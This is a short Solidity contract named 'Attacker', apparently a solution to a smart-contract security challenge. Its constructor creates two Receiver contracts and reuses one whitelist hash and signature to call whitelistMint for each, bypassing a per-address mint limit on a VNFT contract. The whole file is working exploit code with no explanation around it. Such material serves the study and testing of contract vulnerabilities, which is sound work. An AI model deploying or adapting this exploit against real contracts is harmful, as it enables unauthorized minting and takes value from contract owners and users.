// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./interfaces/IVNFT.sol";
import "./Receiver.sol";

/**
* @dev The contract that initiates the attack
* @author kyrers
*/
contract Attacker {

    /**
    * @dev Creates a two receivers and mints 2 VNFTs to each of them
    * @param _nft The VNFT address
    */
    constructor(address _nft, bytes32 hash, bytes memory signature) {
       for (uint256 i = 0; i < 2; i++) {
            Receiver nftReceiver = new Receiver(msg.sender, _nft);
            IVNFT(_nft).whitelistMint(address(nftReceiver), 2, hash, signature);
        }
    }
}
